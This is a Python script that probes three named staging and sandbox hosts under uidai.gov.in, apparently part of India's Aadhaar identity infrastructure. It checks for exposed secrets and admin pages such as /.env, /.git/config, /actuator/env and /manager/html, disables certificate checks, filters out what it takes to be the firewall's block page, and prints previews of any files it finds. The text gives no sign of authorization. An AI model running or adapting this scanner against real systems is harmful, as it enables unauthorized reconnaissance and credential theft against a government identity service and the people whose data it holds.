"""
Targeted Fuzzer for Staging and Sandbox Environments
"""
import requests
import warnings
warnings.filterwarnings('ignore')

TARGETS = [
    "https://myaadhaarstage.uidai.gov.in",
    "https://sandbox.uidai.gov.in",
    "https://biochallenge.uidai.gov.in"
]

CRITICAL_PATHS = [
    "/.env", "/.git/config", "/api-docs", "/v2/api-docs", "/swagger-ui.html",
    "/actuator/env", "/manager/html", "/server-status",
    "/assets/lib/.env", "/main.dart.js", "/main.dart.js.map"
]

print("=" * 70)
print("FUZZING STAGING ENVIRONMENTS")
print("=" * 70)

for target in TARGETS:
    print(f"\n[SCANNING] {target}")
    for path in CRITICAL_PATHS:
        url = target + path
        try:
            r = requests.get(url, timeout=5, verify=False, allow_redirects=False)
            
            # Filter generic block pages (assuming size 2490 is still WAF)
            size = len(r.content)
            if r.status_code in [200, 301, 302] and size != 2490:
                print(f"  [+] FOUND [{r.status_code}] - {url} (Size: {size})")
                if "main.dart.js" not in path and size < 1000:
                    print(f"      Preview: {r.text[:150].strip()}")
            elif r.status_code == 401:
                print(f"  [!] AUTH REQ [{r.status_code}] - {url}")
        except Exception:
            pass

print("\n" + "=" * 70)
print("SCAN COMPLETE")
print("=" * 70)
